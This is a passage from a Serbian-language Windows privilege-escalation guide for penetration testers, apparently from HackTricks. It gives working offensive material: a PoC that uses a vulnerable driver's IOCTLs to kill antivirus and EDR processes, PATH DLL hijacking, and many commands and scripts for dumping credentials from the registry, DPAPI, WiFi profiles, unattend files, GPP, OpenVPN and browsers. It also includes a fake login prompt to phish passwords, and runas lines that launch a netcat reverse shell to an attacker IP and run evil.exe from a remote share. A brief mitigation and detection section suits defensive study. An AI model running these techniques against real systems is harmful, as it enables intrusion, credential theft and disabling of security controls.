- Vraćanje full-access handle‑a ka arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Termination of arbitrary processes, uključujući Protected Process/Light (PP/PPL), što omogućava AV/EDR kill iz user land‑a preko kernela.

Minimalni PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigacije za developere
- Uvek postavite FILE_DEVICE_SECURE_OPEN kada kreirate device objekte koji treba da budu ograničeni DACL-om.
- Validirajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-a.
- Ograničite IOCTLs (access masks, METHOD_*, input validation) i razmotrite brokered modele umesto direktnih kernel privilegija.

Predlozi za detekciju za odbrambene timove
- Nadgledajte user-mode otvaranja sumnjivih imena uređaja (e.g., \\ .\\amsdk*) i specifične IOCTL sekvence koje ukazuju na zloupotrebu.
- Sprovodite Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/odbijenih.

## PATH DLL Hijacking

Ako imate **write permissions inside a folder present on PATH** mogli biste moći da hijack a DLL koji učitava proces i **escalate privileges**.

Proverite dozvole svih foldera unutar PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako zloupotrebiti ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mreža

### Deljeni resursi
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Proveri da li su u hosts file hardkodirani drugi poznati računari
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite da li su izvana dostupni **servisi sa ograničenim pristupom**
```bash
netstat -ano #Opened ports?
```
### Tabela rutiranja
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabela
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall pravila

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(prikaži pravila, kreiraj pravila, isključi, isključi...)**

Više[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binarni `bash.exe` se takođe može naći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root user, možete da slušate na bilo kom portu (prvi put kada koristite `nc.exe` da slušate na portu, GUI će vas pitati da li `nc` treba da bude dozvoljen od strane firewall-a).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete pokušati `--default-user root`

Možete istražiti `WSL` fajl-sistem u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows kredencijali

### Winlogon kredencijali
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menadžer kredencijala / Windows Vault

Izvor: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault čuva korisničke kredencijale za servere, web-sajtove i druge programe za koje **Windows** može **automatski prijaviti korisnike**. Na prvi pogled može delovati kao da korisnici mogu čuvati svoje Facebook, Twitter, Gmail itd. kredencijale kako bi se automatski prijavljivali putem pregledača. Ali to nije tako.

Windows Vault čuva kredencijale koje Windows može automatski koristiti za prijavu korisnika, što znači da svaka **Windows aplikacija kojoj su potrebni kredencijali za pristup resursu** (serveru ili web-sajtu) **može iskoristiti ovaj Credential Manager** i Windows Vault i koristiti te kredencijale umesto da korisnici stalno unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da im nije moguće koristiti kredencijale za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako **komunicirati sa credential manager-om i zatražiti kredencijale za taj resurs** iz podrazumevanog skladišnog vault-a.

Koristite `cmdkey` da prikažete sačuvane kredencijale na mašini.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` kako biste koristili sačuvane akredencijale. Sledeći primer poziva udaljeni binarni preko SMB share-a.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa prosleđenim podacima za prijavu.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Napomena: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ili iz [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** pruža metodu za simetričnu enkripciju podataka, pretežno korišćenu u Windows operativnom sistemu za simetričnu enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi korisničku ili sistemsku tajnu koja značajno doprinosi entropiji.

**DPAPI omogućava enkripciju ključeva pomoću simetričnog ključa koji je izveden iz korisničkih prijavnih tajni**. U scenarijima sistemske enkripcije, koristi tajne autentifikacije domena sistema.

Kriptovani korisnički RSA ključevi, koristeći DPAPI, smešteni su u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji je smešten zajedno sa master ključem koji štiti korisnikove privatne ključeve u istom fajlu**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što sprečava listanje njegovog sadržaja pomoću komande `dir` u CMD, iako se može listati preko PowerShell-a).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da ga dešifrujete.

**credentials files protected by the master password** se obično nalaze u:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da dešifrujete.\
Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** pomoću `sekurlsa::dpapi` modula (ako ste root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** se često koriste za **scripting** i zadatke automatizacije kao način da praktično čuvate šifrovane kredencijale. Kredencijali su zaštićeni korišćenjem **DPAPI**, što obično znači da mogu biti dešifrovani samo od strane istog korisnika na istom računaru na kojem su kreirani.

Da biste **decrypt** PS credentials iz fajla koji ih sadrži, možete uraditi:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP konekcije

Možete ih pronaći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno pokrenute naredbe
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Upravitelj kredencijala za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Koristite **Mimikatz** `dpapi::rdg` modul sa odgovarajućim `/masterkey` da **dešifrujete bilo koje .rdg files**\
Možete **extract many DPAPI masterkeys** iz memorije sa Mimikatz `sekurlsa::dpapi` modulom

### Sticky Notes

Ljudi često koriste StickyNotes app na Windows radnim stanicama da **save passwords** i druge informacije, ne shvatajući da je u pitanju datoteka baze podataka. Ova datoteka se nalazi na `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi pretražiti i pregledati.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
Ako ova datoteka postoji onda je moguće da su neke **credentials** konfigurisane i mogu biti **recovered**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalateri se **izvršavaju sa SYSTEM privileges**, mnogi su ranjivi na **DLL Sideloading (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fajlovi i Registry (Kredencijali)

### Putty Kredencijali
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ključevi hosta
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys u registru

SSH private keys mogu biti pohranjeni u ključu registra `HKCU\Software\OpenSSH\Agent\Keys` pa bi trebalo da proverite da li se tamo nalazi nešto interesantno:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji zapis unutar te putanje, verovatno je u pitanju sačuvan SSH ključ. Skladišten je enkriptovan, ali se može lako dekriptovati koristeći [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis ne radi i želite da se automatski pokrene pri pokretanju sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije primenljiva. Pokušao sam da napravim neke ssh keys, dodam ih pomoću `ssh-add` i prijavim se putem ssh na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Nezaštićene datoteke
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Takođe možete pretražiti ove fajlove koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rezervne kopije
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud kredencijali
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potražite datoteku pod imenom **SiteList.xml**

### Cached GPP Pasword

Ranije je postojala funkcionalnost koja je omogućavala raspoređivanje prilagođenih lokalnih administrator naloga na grupu računara putem Group Policy Preferences (GPP). Međutim, ova metoda je imala ozbiljne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), koji su smešteni kao XML datoteke u SYSVOL, mogli su biti pristupljeni od strane bilo kog korisnika domena. Drugo, lozinke unutar ovih GPP-ova, šifrovane AES256 koristeći javno dokumentovani podrazumevani ključ, mogle su biti dešifrovane od strane bilo kog autentifikovanog korisnika. To je predstavljalo ozbiljan rizik, jer je moglo omogućiti korisnicima da dobiju povišene privilegije.

Da bi se umanjio ovaj rizik, razvijena je funkcija koja pretražuje lokalno keširane GPP datoteke koje sadrže polje "cpassword" koje nije prazno. Nakon što pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell object. Taj object uključuje detalje o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i saniranju ovog bezbednosnog propusta.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da biste dešifrovali cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec za dobijanje lozinki:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config-a sa kredencijalima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kredencijali
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logovi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Zatražite kredencijale

Uvek možete **zamoliti korisnika da unese svoje kredencijale, pa čak i kredencijale drugog korisnika** ako mislite da ih može znati (imajte na umu da je **direktno traženje** od klijenta za **kredencijale** zaista **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi fajlova koji sadrže credentials**

Poznati fajlovi koji su pre nekog vremena sadržavali **passwords** u **clear-text** ili **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pretraži sve predložene datoteke:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials u RecycleBin-u

Takođe treba da proverite Bin da biste u njemu potražili credentials

Za **recover passwords** sačuvane u raznim programima možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registry-a

**Ostali mogući registry ključevi sa credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proveriš baze podataka u kojima su sačuvane lozinke iz **Chrome or Firefox**.\
Takođe proveri istoriju, bookmarke i favorite pregledača — moguće je da su tamo sačuvane neke lozinke.

Alati za ekstrakciju lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) je tehnologija ugrađena u Windows operativni sistem koja omogućava međukomunikaciju između softverskih komponenti pisanih u različitim jezicima. Svaka COM komponenta je identifikovana putem class ID-ja (CLSID) i svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih putem interface ID-eva (IIDs).

COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** respektivno. Ovaj registar se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

U suštini, ako možeš prepisati bilo koji od DLL-ova koji će biti izvršeni, mogao bi eskalirati privilegije ako taj DLL bude izvršen od strane drugog korisnika.

Da bi video kako napadači koriste COM Hijacking kao mehanizam za persistenciju, pogledaj:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

Pretraži sadržaj fajlova
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Pretraga fajla po imenu**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registry za nazive ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji traže passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin koji sam napravio da **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže passwords pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za ekstrakciju password-a iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sessions**, **usernames** i **passwords** iz nekoliko alata koja čuvaju ove podatke u clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **potpunim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama ali nasleđujući sve otvorene handles glavnog procesa**.\
Ako imate **potpun pristup procesu sa niskim privilegijama**, možete dohvatiti **otvoreni handle privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **injektovati shellcode**.\
[Pročitajte ovaj primer za više informacija o **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte ovu **drugu objavu za potpunije objašnjenje kako testirati i zloupotrebiti više open handlers procesa i thread-ova nasleđenih sa različitim nivoima dozvola (ne samo potpun pristup)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, poznati kao **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows nudi funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima deljenje podataka, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada podaci budu poslati kroz pipe od strane **client-a**, **server** koji je kreirao pipe ima mogućnost da **preuzme identitet** **client-a**, pod uslovom da ima neophodna prava **SeImpersonate**. Identifikovanje **privilegovanog procesa** koji komunicira preko pipe-a koji možete imitirati pruža priliku da **dobijete veće privilegije** preuzimanjem identiteta tog procesa kada on interaguje sa pipe-om koji ste uspostavili. Za uputstva kako izvesti takav napad, korisni vodiči su dostupni [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

